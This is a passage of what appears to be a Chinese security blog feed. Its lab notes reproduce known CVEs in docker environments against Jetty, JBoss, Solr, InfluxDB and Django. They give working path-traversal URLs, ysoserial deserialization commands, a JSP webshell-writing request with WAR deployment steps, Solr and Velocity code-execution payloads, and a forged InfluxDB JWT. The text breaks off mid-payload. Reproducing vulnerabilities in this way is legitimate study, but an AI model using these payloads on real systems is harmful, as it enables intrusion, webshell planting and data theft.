    <content type="html"><![CDATA[<h1 id="jetty-漏洞学习"><a href="#jetty-漏洞学习" class="headerlink" title="jetty 漏洞学习"></a>jetty 漏洞学习</h1><h2 id="Jetty-WEB-INF-敏感信息泄露漏洞（CVE-2021-28164）（CVE-2021-34229）"><a href="#Jetty-WEB-INF-敏感信息泄露漏洞（CVE-2021-28164）（CVE-2021-34229）" class="headerlink" title="Jetty WEB-INF 敏感信息泄露漏洞（CVE-2021-28164）（CVE-2021-34229）"></a>Jetty WEB-INF 敏感信息泄露漏洞（CVE-2021-28164）（CVE-2021-34229）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Jetty 9.4.37引入对RFC3986的新实现，而URL编码的.字符被排除在URI规范之外，这个行为在RFC中是正确的，但在servlet的实现中导致攻击者可以通过%2e来绕过限制，下载WEB-INF目录下的任意文件，导致敏感信息泄露。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>jetty  9.4.37</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在docker中启动容器，访问<a href="http://your-ip:8080/">http://your-ip:8080</a> 出现下面的界面即表示环境搭建成功<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/jetty.png"><br>直接访问 <code>http://your-ip:8080/WEB-INF/web.xml</code>会显示404错误<br>可以使用 &#x2F;%u002e&#x2F;绕过，访问<code>http://your-ip:8080/%u002e/WEB-INF/web.xml</code>可以访问<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/jetty-1.png"></p><h2 id="Jetty-通用-Servlets-组件-ConcatServlet-信息泄露漏洞（CVE-2021-28169）"><a href="#Jetty-通用-Servlets-组件-ConcatServlet-信息泄露漏洞（CVE-2021-28169）" class="headerlink" title="Jetty 通用 Servlets 组件 ConcatServlet 信息泄露漏洞（CVE -2021-28169）"></a>Jetty 通用 Servlets 组件 ConcatServlet 信息泄露漏洞（CVE -2021-28169）</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在9.4.40, 10.0.2, 11.0.2版本前，Jetty Servlets中的<code>ConcatServlet</code>、<code>WelcomeFilter</code>类存在多重解码问题，如果开发者主动使用了这两个类，攻击者可以利用其访问WEB-INF目录下的敏感文件，造成配置文件及代码泄露。</p><h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><p>9.4.40, 10.0.2, 11.0.2版本前</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在docker中启动容器，出现下面的页面即表示环境搭建成功<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/jetty.png"><br>正常访问your-ip:8080&#x2F;static?&#x2F;WEB-INF&#x2F;web.xml返回404状态码<br>，进行二次URL编码后再次访问可以获取到WEB-INF&#x2F;web.xml文件<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/jetty-3.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>jboss 漏洞学习</title>
    <link href="/cllafrcoo000bfout94j0768j/"/>
    <url>/cllafrcoo000bfout94j0768j/</url>
    
    <content type="html"><![CDATA[<h1 id="jboss漏洞学习"><a href="#jboss漏洞学习" class="headerlink" title="jboss漏洞学习"></a>jboss漏洞学习</h1><h2 id="JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）"><a href="#JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）"></a>JBoss 5.x&#x2F;6.x 反序列化漏洞（CVE-2017-12149）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。访问<a href="http://your-ip:8080/invoker/readonly%E5%87%BA%E7%8E%B0500%E7%95%8C%E9%9D%A2%E5%A4%A7%E6%A6%82%E7%8E%87%E6%9C%89%E6%AD%A4%E6%BC%8F%E6%B4%9E">http://your-ip:8080/invoker/readonly出现500界面大概率有此漏洞</a></p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>jboss 5.x 6.x</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>启动docker环境，访问<a href="http://your-ip:8080出现jboss默认界面即为搭建成功">http://your-ip:8080出现jboss默认界面即为搭建成功</a><br>使用ysoserial.jar进行反序列化利用，此处使用的gadgets为CommonsCollections5</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -jar ysoserial.jar CommonsCollections5 &quot;touch /tmp/has_been_hacked&quot; &gt; poc3.ser<br></code></pre></td></tr></table></figure><p>得到poc3.ser文件，再利用curl向<a href="http://your-ip:8080/invoker/readonly%E5%8F%91%E9%80%81%E6%AD%A4%E6%96%87%E4%BB%B6%E5%86%85%E7%9A%84poc">http://your-ip:8080/invoker/readonly发送此文件内的poc</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl http://your-ip:8080/invoker/readonly --data-binary poc.ser<br></code></pre></td></tr></table></figure><p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/jboss-1.png"><br>进入docker容器发现此文件已被创建<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/jboss-2.png"></p><h2 id="JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）"><a href="#JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）" class="headerlink" title="JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）"></a>JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码</p><h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><p>jboss 4.x</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>启动docker环境，访问<a href="http://your-ip:8080出现jboss默认界面即为搭建成功">http://your-ip:8080出现jboss默认界面即为搭建成功</a><br>使用ysoserial.jar进行反序列化利用，此处使用的gadgets为CommonsCollections5</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -jar ysoserial.jar CommonsCollections5 &quot;touch /tmp/success&quot; &gt; poc.ser<br></code></pre></td></tr></table></figure><p>再使用curl传输poc.ser文件的内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @poc.ser<br><br></code></pre></td></tr></table></figure><p>进入docker容器发现此文件已被创建<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/jboss-3.png"></p><h2 id="JBoss-JMXInvokerServlet-反序列化漏洞"><a href="#JBoss-JMXInvokerServlet-反序列化漏洞" class="headerlink" title="JBoss JMXInvokerServlet 反序列化漏洞"></a>JBoss JMXInvokerServlet 反序列化漏洞</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>JBoss在&#x2F;invoker&#x2F;JMXInvokerServlet请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码。</p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>启动docker环境，访问<a href="http://your-ip:8080出现jboss默认界面即为搭建成功">http://your-ip:8080出现jboss默认界面即为搭建成功</a><br>使用ysoserial.jar进行反序列化利用，此处使用的gadgets为CommonsCollections5</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -jar ysoserial.jar CommonsCollections5 &quot;touch /tmp/success&quot; &gt; poc.ser<br><br></code></pre></td></tr></table></figure><p>再使用curl传输poc.ser文件的内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl http://your-ip:8080/invoker/JMXInvokerServlet --data-binary @poc.ser<br><br></code></pre></td></tr></table></figure><p>进入docker容器发现此文件已被创建<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/jboss-4.png"></p><h2 id="JBoss-未授权访问"><a href="#JBoss-未授权访问" class="headerlink" title="JBoss 未授权访问"></a>JBoss 未授权访问</h2><h3 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在低版本中，默认可以访问Jboss web控制台(<a href="http://127.0.0.1:8080/jmx-console)%EF%BC%8C%E6%97%A0%E9%9C%80%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81">http://127.0.0.1:8080/jmx-console)，无需用户名和密码</a><br>jboss 4.x 之前的版本console路径&#x2F;jmx-console&#x2F;。可能存在console未授权访问，可直接部署war包，若需登录，尝试弱口令登录后部署war包。<br>jboss 6.x 版本console路径&#x2F;admin-console&#x2F;。尝试弱口令登录后台上传war包。</p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><ol><li>写入一句话木马</li></ol><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery">http://ip/jmx-console//HtmlAdaptor?action=invokeOpByName<span class="hljs-built_in">&amp;name</span>=jboss.admin<span class="hljs-meta">%3Aservice</span><span class="hljs-meta">%3DDeploymentFileRepository</span>&amp;methodName=store&amp;argType=java<span class="hljs-built_in">.lang</span>.String&amp;arg<span class="hljs-number">0</span>=August.war&amp;argType=java<span class="hljs-built_in">.lang</span>.String&amp;&amp;arg1=shell&amp;argType=java<span class="hljs-built_in">.lang</span>.String&amp;arg2=.jsp&amp;argType=java<span class="hljs-built_in">.lang</span>.String&amp;arg3=<span class="hljs-meta">%3c</span><span class="hljs-meta">%25</span>+<span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-meta">%22f</span><span class="hljs-meta">%22</span>)!<span class="hljs-meta">%3dnull</span>)(new+java.io.FileOutputStream(application.getRealPath(<span class="hljs-meta">%22</span><span class="hljs-meta">%2f</span><span class="hljs-meta">%22</span>)<span class="hljs-meta">%2brequest</span>.getParameter(<span class="hljs-meta">%22f</span><span class="hljs-meta">%22</span>))).write(request.getParameter(<span class="hljs-meta">%22t</span><span class="hljs-meta">%22</span>).getBytes())<span class="hljs-meta">%3b</span>+<span class="hljs-meta">%25</span><span class="hljs-meta">%3e</span>&amp;argType<span class="hljs-built_in">=boolean</span>&amp;arg4=True<br><br></code></pre></td></tr></table></figure><p>其中arg1为文件名称，arg2为文件后缀，arg3为文件内容<br>2. 部署war包<br>首先需要将war包放在自己的服务器上<br>然后找到jboss.deployment（jboss 自带的部署功能）中的flavor&#x3D;URL,type&#x3D;DeploymentScanner点进去（通过 url 的方式远程部署）<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/jboss-5.png"><br>找到页面中的void addURL()选项来远程加载war包来部署。<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/jboss-6.png"><br>返回到刚进入jmx-console的页面，找到 jboss.web.deployment，如下说明部署成功。如果没显示，多刷新几次页面或者等会儿，直到看到有部署的war包即可<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/jboss-7.png"><br>访问<a href="http://your-ip/shell/xx.jsp%E5%8D%B3%E5%8F%AF">http://your-ip/shell/xx.jsp即可</a></p><h5 id="war包的制作："><a href="#war包的制作：" class="headerlink" title="war包的制作："></a>war包的制作：</h5><p>进入jdk目录下的bin目录(例如C:\Program Files\Java\jdk1.8.0_101\bin)，进入命令行。<br>输入jar cvf shell.war shell.jsp<br>注：shell.war是你要做出了的war文件，shell.jsp是提前准备的jsp木马文件</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>solr 漏洞学习</title>
    <link href="/cllafrcor000gfout7542amuq/"/>
    <url>/cllafrcor000gfout7542amuq/</url>
    
    <content type="html"><![CDATA[<h1 id="solr-漏洞学习"><a href="#solr-漏洞学习" class="headerlink" title="solr 漏洞学习"></a>solr 漏洞学习</h1><h2 id="关于solr"><a href="#关于solr" class="headerlink" title="关于solr"></a>关于solr</h2><p>Apache Solr是一个流行的开源搜索服务器，它通过使用类似REST的HTTP API，这就确保你能从几乎任何编程语言来使用solr。<br>solr本身也可以看成数据库,(no sql类型),但它比数据库搜索速度更快,所以在项目中我们一般把搜搜的部分交给solr,就像我们在京东首页所看到的商品信息,并不是来自数据库,而是来源于sorl的索引库<br>数据库本身不能实现分词效果,而只能使用模糊查询,但是模糊查询非常低效,查询速度比较慢,由于在实际生活中,一般搜索是用的比较多的,这样数据库压力自然就很大,所以我们就让供专业的solr来做搜索功能</p><h2 id="CVE-2019-0193"><a href="#CVE-2019-0193" class="headerlink" title="CVE-2019-0193"></a>CVE-2019-0193</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。即控制dataConfig字段实现xxe注入，实现命令执行</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Apache solr &lt; 8.2.0<br>启动docker镜像，访问your-ip:8983<br>其中 ，访问your-ip:8983&#x2F;solr&#x2F;admin&#x2F;cores可以查看已创建的核心<br>复现时，首先在docker镜像中创建一个solr核心，命令为:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db<br></code></pre></td></tr></table></figure><p>其中test为core名称。创建好后，进入solr的admin界面 your-ip:8983&#x2F;solr&#x2F;,选择刚刚创建的core<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/solr-0.png"><br>选择dataimport模块<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/solr-1.png"><br>开启debug模式<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/solr-2.png"><br>点击Execute with this Configuration,使用burp抓包，将数据包中的dataConfig模块更改为下面的payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dataConfig</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;URLDataSource&quot;</span>/&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">&lt;![CDATA[ function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/success&quot;); &#125; ]]&gt;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">document</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">entity</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;stackoverflow&quot;</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span> <span class="hljs-attr">processor</span>=<span class="hljs-string">&quot;XPathEntityProcessor&quot;</span> <span class="hljs-attr">forEach</span>=<span class="hljs-string">&quot;/feed&quot;</span> <span class="hljs-attr">transformer</span>=<span class="hljs-string">&quot;script:poc&quot;</span> /&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">document</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">dataConfig</span>&gt;</span><br></code></pre></td></tr></table></figure><p>要注意的是，数据包中原有的dataConfig字段的值是经过url编码的，所以上面的payload也要经过url编码后才可以发送<br>发送数据包后，进入容器界面，文件创建成功<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/solr-3.png"></p><h2 id="CVE-2019-17558"><a href="#CVE-2019-17558" class="headerlink" title="CVE-2019-17558"></a>CVE-2019-17558</h2><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>攻击者通过未授权访问solr服务器，发送特定的数据包开启 params.resource.loader.enabled，然后get访问接口导致服务器命令执行。</p><h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><p>5.0.0 到 8.3.1版本</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>启动docker镜像，访问your-ip:8983&#x2F;solr&#x2F;admin&#x2F;cores即可获取所有cores的信息，可以发现有demo核心<br>访问your-ip:8983&#x2F;solr&#x2F;demo&#x2F;config发现 params.resource.loader.enabled为false（默认均为false），而此漏洞的里利用需要params.resource.loader.enabled为true，可以通过向&#x2F;solr&#x2F;demo&#x2F;config发送post数据包更改该属性值，数据包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/solr/demo/config</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>solr:8983<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>259<br><br><span class="language-n1ql"></span><br><span class="language-n1ql">&#123;</span><br><span class="language-n1ql">  &quot;<span class="hljs-keyword">update</span>-queryresponsewriter<span class="hljs-string">&quot;: &#123;</span></span><br><span class="hljs-string"><span class="language-n1ql">    &quot;</span>startup<span class="hljs-string">&quot;: &quot;</span>lazy<span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-n1ql">    &quot;</span>name<span class="hljs-string">&quot;: &quot;</span>velocity<span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-n1ql">    &quot;</span>class<span class="hljs-string">&quot;: &quot;</span>solr.VelocityResponseWriter<span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-n1ql">    &quot;</span>template.base.dir<span class="hljs-string">&quot;: &quot;</span><span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-n1ql">    &quot;</span>solr.resource.loader.enabled<span class="hljs-string">&quot;: &quot;</span><span class="hljs-literal">true</span><span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-n1ql">    &quot;</span>params.resource.loader.enabled<span class="hljs-string">&quot;: &quot;</span><span class="hljs-literal">true</span><span class="hljs-string">&quot;</span></span><br><span class="hljs-string"><span class="language-n1ql">  &#125;</span></span><br><span class="hljs-string"><span class="language-n1ql">&#125;</span></span><br></code></pre></td></tr></table></figure><p>此时已经满足该漏洞的利用条件，payload为：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">/solr/demo/select?q=<span class="hljs-number">1</span>&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$x</span>=<span class="hljs-meta">%27</span><span class="hljs-meta">%27</span>)+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$rt</span>=<span class="hljs-variable">$x</span>.class.forName(<span class="hljs-meta">%27java</span><span class="hljs-built_in">.lang</span>.Runtime<span class="hljs-meta">%27</span>))+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$chr</span>=<span class="hljs-variable">$x</span>.class.forName(<span class="hljs-meta">%27java</span><span class="hljs-built_in">.lang</span>.Character<span class="hljs-meta">%27</span>))+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$str</span>=<span class="hljs-variable">$x</span>.class.forName(<span class="hljs-meta">%27java</span><span class="hljs-built_in">.lang</span>.String<span class="hljs-meta">%27</span>))+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$ex</span>=<span class="hljs-variable">$rt</span>.getRuntime().exec(<span class="hljs-meta">%27whoami</span><span class="hljs-meta">%27</span>))+<span class="hljs-variable">$ex</span>.waitFor()+<span class="hljs-meta">%23set</span>(<span class="hljs-variable">$out</span>=<span class="hljs-variable">$ex</span>.getInputStream())+<span class="hljs-meta">%23foreach</span>(<span class="hljs-variable">$i</span>+<span class="hljs-keyword">in</span>+[<span class="hljs-number">1</span>..<span class="hljs-variable">$out</span>.available()])<span class="hljs-variable">$str</span>.valueOf(<span class="hljs-variable">$chr</span>.toChars(<span class="hljs-variable">$out</span>.read()))<span class="hljs-meta">%23end</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>influxdb 漏洞学习</title>
    <link href="/cllafrcon000afoutclmug7fv/"/>
    <url>/cllafrcon000afoutclmug7fv/</url>
    
    <content type="html"><![CDATA[<h1 id="influxdb-漏洞学习"><a href="#influxdb-漏洞学习" class="headerlink" title="influxdb 漏洞学习"></a>influxdb 漏洞学习</h1><h2 id="influxdb未授权访问漏洞"><a href="#influxdb未授权访问漏洞" class="headerlink" title="influxdb未授权访问漏洞"></a>influxdb未授权访问漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>influxdb是一款著名的时序数据库，其使用jwt作为鉴权方式。在用户开启了认证，但未设置参数shared-secret的情况下，jwt的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>InfluxDB &lt; 1.7.6</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>启动docker环境。<br>访问your-ip:8086&#x2F;debug&#x2F;vars可以查看到一些服务的信息<br>此漏洞主要是利用jwt认证秘钥为空，伪造jwt进行身份验证，从而执行sql语句获取influxdb中的数据。伪造jwt利用jwt.io网站<br>influxdb的jwt格式如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>   <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>   <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><br>   <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><br>   <span class="hljs-attr">&quot;exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1676346267</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>其中username处为一个存在的用户名，exp为此jwt过期的时间戳，需要将此时间戳换为未来的某个时间即可。<br>通过jwt.io生成jwt,将jwt替换到下面的数据包中的Authorization处即可未授权访问influxdb</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/query</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:8086<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjU5MjQzMTA3fQ.Hy_RUqFF_1NPZWmRObYicECe9XA9IAmYSoKjfv4LJ5Q<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>32<br><br><span class="language-ini"></span><br><span class="language-ini"><span class="hljs-attr">q</span>=show+users</span><br></code></pre></td></tr></table></figure><p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/influx.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>此漏洞的利用需要一些influxdb的知识:<br>SHOW USERS    查看当前所有的数据库用户<br>SHOW DATABASES    查看所有的数据库<br>SHOW MEASUREMENTS    查询当前数据库中含有的表<br>SHOW FIELD KEYS    查看当前数据库所有表的字段<br>CREATE USER a WITH PASSWORD ‘abc’    创建a:abc 数据库用户<br>其他查询和正常的sql语句相同</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>django 漏洞学习</title>
    <link href="/cllafrcoi0004foutc9gya5p4/"/>
    <url>/cllafrcoi0004foutc9gya5p4/</url>
    
    <content type="html"><![CDATA[<h1 id="django-漏洞学习"><a href="#django-漏洞学习" class="headerlink" title="django 漏洞学习"></a>django 漏洞学习</h1><h2 id="Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）"><a href="#Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）" class="headerlink" title="Django JSONField&#x2F;HStoreField SQL注入漏洞（CVE-2019-14234）"></a>Django JSONField&#x2F;HStoreField SQL注入漏洞（CVE-2019-14234）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>该漏洞需要开发者使用了JSONField&#x2F;HStoreField，且用户可控queryset查询时的键名，在键名的位置注入SQL语句。Django自带的后台应用Django-Admin中就存在这样的写法</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>此漏洞需要登录Django后台管理页面，此处账号密码为admin&#x2F;a123123123<br>访问<a href="http://your-ip:8000/admin%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%B8%8A%E9%9D%A2%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%AF%E4%BB%A5%E8%BF%9B%E5%85%A5%E6%A8%A1%E5%9E%8B%E7%9A%84%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2">http://your-ip:8000/admin进入后台管理页面，使用上面的账号密码登录后可以进入模型的管理界面</a> <a href="http://your-ip:8000/admin/vuln/collection/">http://your-ip:8000/admin/vuln/collection/</a><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/django-1.png"><br>构造detail__a’b键值，发现报错：<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/django-2.png"><br>证明此处有SQL注入漏洞<br>由于此处Django框架搭配的是postgresql，所以配合postgresql的CVE进行命令执行<br>依次执行下面两个语句</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://your-ip:<span class="hljs-number">8000</span>/admin/vuln/collection/?detail__title%<span class="hljs-number">27</span>)%<span class="hljs-number">3</span>d%<span class="hljs-number">271</span>%<span 